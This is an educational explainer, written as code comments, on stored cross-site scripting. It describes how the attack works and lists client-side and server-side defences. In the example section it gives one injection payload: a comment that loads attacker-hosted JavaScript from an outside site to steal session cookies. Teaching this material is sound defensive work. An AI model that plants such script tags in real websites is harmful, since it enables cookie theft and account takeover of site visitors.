// Persistent Cross-site Scripting (Persistent XSS)

// The Persistent XSS attack is a variant of cross-site scripting. It is also known as stored XSS.
// It happens when the server stores the data injected by the attacker into the web page, and then the server displays 
//the data to other users who are surfing the website as well. This injected data could be stored in a file, database, cookie,
// or even as session data. On visiting the vulnerable web page, the payload gets served to the victim and get executed in their environment. Most of the users, who are visiting the vulnerable web page will get infected as malicious data is persisted in the server.  

// Persistent XSS attacks are happening through two requests and so it is also known as Type 2 XSS attacks. 
// The first request specifies the mean code injection and its persistence on the webserver. The second request specifies target
// victims loading the pages that have the payload.

// One of the standard instances of this type of exposure is online message boards where users update messages which
// any other user can read. Other common platforms are blogs, social networks, and video sharing platforms.



// The main aims of these types of attack are:

// Data stealing
// Cookie stealing

 

// Examples of Persistent XSS attack

// The attacker realizes vulnerability in a website that allows HTML tags to be embedded in the comments section of that site.
// Then the attacker injects malicious script into that server. The inserted tags become part of that page permanently and get
// loaded every time the page is opened.

// For example, if the attacker adds the below comment into a vulnerable website:

// Offer for today! Get details here <script src=”http://mysite.com/hack.js”> </script>
// Once this code is added, every time the page is accessed, a JavaScript code will get activated by the HTML tag in the comment. This JavaScript code is hosted on another site and it can steal the session cookies of the visitors visiting the website as well. Once the hacker gets the session cookie, the visitor's account is compromised and the attacker can access their personal information and credit card data. The visitor who is accessing the website is not aware that the attack happened and their personal data is hacked.

// According to the hacker's viewpoint, persistent XSS attacks are quite tougher to execute as it is difficult to locate a
// vulnerable website that permits permanent script insertion.




// How to defend against the Persistent XSS attack?

// Defending against this attack can be done on the client-side or server-side.

// 1.Client-side: 
        // The only way to defend against this attack on the client-side is:

        // Disable JavaScript within the browser 
        // It may not be a suitable solution as many websites requires it to function appropriately.
        // Therefore, use a safe, secure browser that is of the latest version and with XSS filters turned on. 
        // Proper sanitization and validation to be performed on user-provided data.

// 2.Server-side: 
        // Some of the measures to defend in server-side are:

        // Sanitize and validate all user input properly before storing it in the webserver.
        // Sanitize the static content before presenting it to the end-users.
        // Use a web vulnerability scanner to detect XSS vulnerability in web applications on a regular basis.